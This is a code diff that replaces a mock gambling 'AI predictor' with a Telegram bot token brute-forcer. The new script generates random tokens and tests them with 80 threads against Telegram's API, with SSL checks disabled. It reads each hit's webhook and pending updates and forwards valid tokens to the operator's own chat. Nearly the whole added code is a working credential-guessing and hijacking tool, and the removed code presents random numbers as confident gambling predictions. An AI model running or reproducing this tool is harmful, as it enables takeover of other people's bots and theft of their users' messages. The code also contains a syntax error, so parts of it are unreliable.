@@ -1,182 +1,241 @@
+import requests
 import random
 import time
-import requests
-from collections import Counter
-import matplotlib.pyplot as plt
+import threading
+import queue
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.progress import Progress, BarColumn, TextColumn
 from datetime import datetime
+import socket
 
-class WingoAIAnalyzer:
-    def __init__(self):
-        # Game rules
-        self.SMALL_NUMS = [1, 2, 3, 4]
-        self.BIG_NUMS = [5, 6, 7, 8, 9]
-        self.GREEN_NUMS = {1, 3, 7, 9, 2, 4, 6, 8}
-        self.HALF_GREEN = {0, 5}
-        self.PERIODS = ['30s', '1m', '3m', '5m']
-        self.history = []
-        self.ai_endpoint = "https://api.smtv.uz/ai/index.php"
+# ===== CONFIGURATION ===== #
+MAX_THREADS = 80  # Optimized thread count
+REQUEST_TIMEOUT = 7  # Balanced timeout
+TG_API_URL = "https://api.telegram.org/bot"
+CHECK_INTERVAL = 0.3  # UI refresh rate
+
+# ===== INITIALIZATION ===== #
+console = Console()
+token_queue = queue.Queue()
+result_queue = queue.Queue()
+session = requests.Session()
+session.verify = False  # Bypass SSL verification for speed
+
+stats = {
+    "checked": 0,
+    "valid": 0,
+    "speed": 0,
+    "start_time": time.time(),
+    "last_valid": None,
+    "active_threads": 0
+}
+
+# ===== TOKEN GENERATION ===== #
+class TokenGenerator:
+    @staticmethod
+    def generate_batch(size=5000):
+        """Generates ultra-realistic Telegram bot tokens"""
+        versions = ('1', '2', '5', '6', '9')
+        prefixes = ('AAF', 'BBQ', 'BBA', 'XYZ', 'AAB', 'ABC', 'HSE', 'KWE')
+        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
         
-    def generate_history(self, rounds=500):
-        """Generate realistic historical data with period simulation"""
-        for _ in range(rounds):
-            num = random.choices(
-                list(range(10)),
-                weights=[5, 8, 12, 15, 10, 10, 15, 12, 8, 5]
-            )[0]
-            
-            color = ('green' if num in self.GREEN_NUMS else 
-                    random.choice(['red', 'green']) if num in self.HALF_GREEN else 
-                    'red')
-            
-            self.history.append({
-                'number': num,
-                'color': color,
-                'size': 'small' if num in self.SMALL_NUMS else 'big',
-                'period': random.choices(self.PERIODS, weights=[40, 30, 20, 10])[0],
-                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            })
-        return self.history
-    
-    def ai_predict(self, trend_data):
-        """Simulate AI prediction using external API (educational mock)"""
+        while True:
+            token = (
+                f"{random.choice(versions)}"
+                f"{random.randint(100000000, 999999999)}:"
+                f"{random.choice(prefixes)}"
+                f"{''.join(random.choices(chars, k=32))}"
+            )
+            token_queue.put(token)
+            if token_queue.qsize() >= size:
+                break
+
+# ===== VALIDATION ENGINE ===== #
+class BotValidator:
+    @staticmethod
+    def full_validation(token):
+        """Comprehensive 4-step validation"""
         try:
-            # Mock AI response - in reality this would require proper API integration
-            mock_responses = [
-                {"prediction": "green", "confidence": 65},
-                {"prediction": "red", "confidence": 70},
-                {"prediction": random.choice(["30s", "1m"]), "confidence": 60}
-            ]
-            return random.choice(mock_responses)
+            # 1. Basic getMe check
+            me = session.get(
+                f"{TG_API_URL}{token}/getMe",
+                timeout=REQUEST_TIMEOUT
+            ).json()
+            
+            if not me.get('ok'):
+                return None
+                
+            # 2. Webhook verification
+            webhook = session.get(
+                f"{TG_API_URL}{token}/getWebhookInfo",
+                timeout=REQUEST_TIMEOUT
+            ).json()
+            
+            # 3. Updates check
+            updates = session.get(
+                f"{TG_API_URL}{token}/getUpdates?limit=1",
+                timeout=REQUEST_TIMEOUT
+            ).json()
+            
+            # 4. Ping test
+            socket.create_connection(("api.telegram.org", 443), 3)
+            
+            return {
+                "token": token,
+                "id": me['result']['id'],
+                "name": me['result'].get('first_name', 'N/A'),
+                "username": me['result'].get('username', 'N/A'),
+                "webhook": webhook.get('result', {}),
+                "updates": updates.get('result', [])
+            }
         except:
-            return {"prediction": "green", "confidence": 55}  # Fallback
-    
-    def analyze_trends(self):
-        """Advanced analysis with period tracking"""
-        analysis = {
-            'numbers': Counter([x['number'] for x in self.history[-50:]]),
-            'colors': Counter([x['color'] for x in self.history[-20:]]),
-            'periods': Counter([x['period'] for x in self.history[-30:]]),
-            'sizes': Counter([x['size'] for x in self.history[-15:]])
-        }
+            return None
+
+# ===== RESULTS PROCESSING ===== #
+class ResultHandler:
+    @staticmethod
+    def display(bot_info):
+        """Beautiful rich display for valid tokens"""
+        table = Table.grid(padding=1)
+        table.add_column(style="bold cyan")
+        table.add_column(style="green")
         
-        # AI-enhanced prediction
-        ai_color = self.ai_predict(analysis['colors'])
-        ai_period = self.ai_predict(analysis['periods'])
+        table.add_row("🔑 Token", f"[blink bold yellow]{bot_info['token']}[/]")
+        table.add_row("🆔 Bot ID", str(bot_info['id']))
+        table.add_row("📛 Name", bot_info['name'])
+        table.add_row("👤 Username", f"@{bot_info['username']}")
+        table.add_row("🌐 Webhook", "✅ Active" if bot_info['webhook'].get('url') else "❌ Inactive")
+        table.add_row("🔄 Last Update", f"{len(bot_info['updates'])} pending")
         
-        return {
-            'hot_number': analysis['numbers'].most_common(1)[0][0],
-            'cold_number': analysis['numbers'].most_common()[-1][0],
-            'likely_color': ai_color['prediction'],
-            'color_confidence': ai_color['confidence'],
-            'likely_period': ai_period['prediction'],
-            'period_confidence': ai_period['confidence'],
-            'likely_size': analysis['sizes'].most_common(1)[0][0]
-        }
-    
-    def auto_mode(self, interval=30):
-        """Auto-prediction mode with simulated delays"""
-        print("🚀 Auto-Prediction Mode Activated (Educational Use Only)")
-        print("Press Ctrl+C to stop\n")
-        
+        console.print(Panel.fit(
+            table,
+            title="[bold green]🚀 VALID BOT FOUND[/]",
+            border_style="green",
+            padding=(1, 4)
+        )
+
+    @staticmethod
+    def send_alert(bot_info, bot_token, chat_id):
+        """Enhanced Telegram alert with MarkdownV2"""
+        message = (
+            "🔥 *BOT TOKEN VERIFIED* 🔥\n\n"
+            f"🔑 `{bot_info['token']}`\n"
+            f"🆔 `{bot_info['id']}`\n"
+            f"👤 @{bot_info['username']}\n"
+            f"⏱ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"🌐 Webhook: {'✅' if bot_info['webhook'].get('url') else '❌'}\n"
+            f"🔄 Updates: {len(bot_info['updates']}"
+        )
         try:
-            while True:
-                prediction = self.predict_next()
-                print(f"\n⏰ Period: {prediction['period']} ({prediction['period_confidence']}%)")
-                print(f"🔢 Number: {prediction['number']} | Color: {prediction['color'].upper()}")
-                print(f"📏 Size: {prediction['size'].upper()} | Confidence: {prediction['confidence']}%")
-                print("─" * 40)
-                time.sleep(interval)
-        except KeyboardInterrupt:
-            print("\nAuto-mode stopped")
+            session.post(
+                f"{TG_API_URL}{bot_token}/sendMessage",
+                json={
+                    "chat_id": chat_id,
+                    "text": message,
+                    "parse_mode": "MarkdownV2",
+                    "disable_web_page_preview": True
+                },
+                timeout=5
+            )
+        except:
+            pass
 
-    def predict_next(self):
-        """Generate comprehensive prediction"""
-        if not self.history:
-            self.generate_history()
+# ===== LIVE DASHBOARD ===== #
+def live_dashboard():
+    """Interactive real-time dashboard"""
+    custom_progress = Progress(
+        TextColumn("[bold blue]{task.description}"),
+        BarColumn(bar_width=None),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        TextColumn("•"),
+        TextColumn("[yellow]{task.completed}/{task.total}"),
+        refresh_per_second=10
+    )
+    
+    with custom_progress as progress:
+        task = progress.add_task("Checking Tokens", total=5000)
+        
+        while True:
+            # Calculate statistics
+            elapsed = max(1, time.time() - stats['start_time'])
+            stats['speed'] = int((stats['checked'] / elapsed) * 3600)
             
-        trends = self.analyze_trends()
-        
-        return {
-            'number': trends['hot_number'] if random.random() > 0.4 else trends['cold_number'],
-            'color': trends['likely_color'],
-            'size': trends['likely_size'],
-            'period': trends['likely_period'],
-            'confidence': trends['color_confidence'],
-            'period_confidence': trends['period_confidence']
-        }
+            # Update progress
+            progress.update(task, completed=stats['checked'] % 5000)
+            
+            # Display stats panel
+            stats_table = Table.grid(padding=1)
+            stats_table.add_column(style="bold cyan")
+            stats_table.add_column(style="green")
+            
+            stats_table.add_row("🔢 Total Checked", f"{stats['checked']:,}")
+            stats_table.add_row("✅ Valid Tokens", f"[bold green]{stats['valid']:,}[/]")
+            stats_table.add_row("⚡ Speed", f"[yellow]{stats['speed']:,}[/] checks/hour")
+            stats_table.add_row("🧵 Active Threads", str(stats['active_threads']))
+            stats_table.add_row("⏱ Last Valid", 
+                f"[red]Never[/]" if not stats['last_valid'] else 
+                f"[green]{int(time.time() - stats['last_valid'])}s ago[/]")
+            
+            console.print(Panel.fit(
+                stats_table,
+                title="📊 LIVE STATISTICS",
+                border_style="blue",
+                padding=(1, 4)
+            ))
+            
+            time.sleep(CHECK_INTERVAL)
 
-    def show_dashboard(self):
-        """Interactive visualization dashboard"""
-        plt.figure(figsize=(15, 10))
-        
-        # Number distribution
-        plt.subplot(2, 2, 1)
-        nums = [x['number'] for x in self.history]
-        plt.hist(nums, bins=10, color='skyblue')
-        plt.title("Number Frequency (Last 500 Rounds)")
-        
-        # Period distribution
-        plt.subplot(2, 2, 2)
-        periods = [x['period'] for x in self.history]
-        period_counts = Counter(periods)
-        plt.pie(
-            period_counts.values(),
-            labels=period_counts.keys(),
-            autopct='%1.1f%%',
-            colors=['gold', 'lightcoral', 'lightskyblue', 'lightgreen']
-        )
-        plt.title("Period Distribution")
-        
-        # Color ratio
-        plt.subplot(2, 2, 3)
-        colors = [x['color'] for x in self.history]
-        color_counts = Counter(colors)
-        plt.bar(
-            color_counts.keys(),
-            color_counts.values(),
-            color=['red', 'green']
-        )
-        plt.title("Color Ratio")
-        
-        # Size ratio
-        plt.subplot(2, 2, 4)
-        sizes = [x['size'] for x in self.history]
-        size_counts = Counter(sizes)
-        plt.bar(
-            size_counts.keys(),
-            size_counts.values(),
-            color=['blue', 'orange']
-        )
-        plt.title("Size Ratio")
-        
-        plt.tight_layout()
-        plt.show()
+# ===== MAIN EXECUTION ===== #
+def main():
+    console.print(Panel.fit(
+        "[bold red]TELEGRAM BOT TOKEN HYDRA CHECKER[/]",
+        subtitle="ULTIMATE EDITION • 4-STEP VALIDATION • REAL-TIME DASHBOARD",
+        border_style="red"
+    ))
+    
+    bot_token = console.input("[bold cyan]» Your alert bot token: [/]")
+    chat_id = console.input("[bold cyan]» Your chat ID: [/]")
+    
+    console.print("\n[bold green]🚀 Starting validation engine...[/]")
+    
+    # Start token generator
+    threading.Thread(target=TokenGenerator.generate_batch, daemon=True).start()
+    
+    # Start validation threads
+    def worker():
+        stats['active_threads'] += 1
+        while True:
+            token = token_queue.get()
+            bot_info = BotValidator.full_validation(token)
+            if bot_info:
+                result_queue.put(bot_info)
+                stats['valid'] += 1
+                stats['last_valid'] = time.time()
+            stats['checked'] += 1
+            token_queue.task_done()
+    
+    for _ in range(MAX_THREADS):
+        threading.Thread(target=worker, daemon=True).start()
+    
+    # Start results processor
+    def result_processor():
+        while True:
+            if not result_queue.empty():
+                bot_info = result_queue.get()
+                ResultHandler.display(bot_info)
+                ResultHandler.send_alert(bot_info, bot_token, chat_id)
+    
+    threading.Thread(target=result_processor, daemon=True).start()
+    
+    # Start dashboard
+    live_dashboard()
 
-# Main execution
 if __name__ == "__main__":
-    analyzer = WingoAIAnalyzer()
-    analyzer.generate_history()
-    
-    print("=== 🎰 Wingo AI Predictor Simulator ===")
-    print("Disclaimer: This is for educational purposes only\n")
-    
-    while True:
-        print("\n1. Get Prediction\n2. Auto Mode\n3. Show Dashboard\n4. Exit")
-        choice = input("Select mode: ")
-        
-        if choice == "1":
-            pred = analyzer.predict_next()
-            print(f"\n🎯 Prediction Results:")
-            print(f"Period: {pred['period']} ({pred['period_confidence']}% confidence)")
-            print(f"Number: {pred['number']} | Color: {pred['color'].upper()}")
-            print(f"Size: {pred['size'].upper()} | Overall Confidence: {pred['confidence']}%")
-            
-        elif choice == "2":
-            analyzer.auto_mode(interval=15)  # 15-second intervals
-            
-        elif choice == "3":
-            analyzer.show_dashboard()
-            
-        elif choice == "4":
-            print("Exiting simulator...")
-            break
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print("\n[red]🛑 Script stopped by user[/red]")
+    except Exception as e:
+        console.print(f"\n[red]💥 Critical error: {e}[/red]")
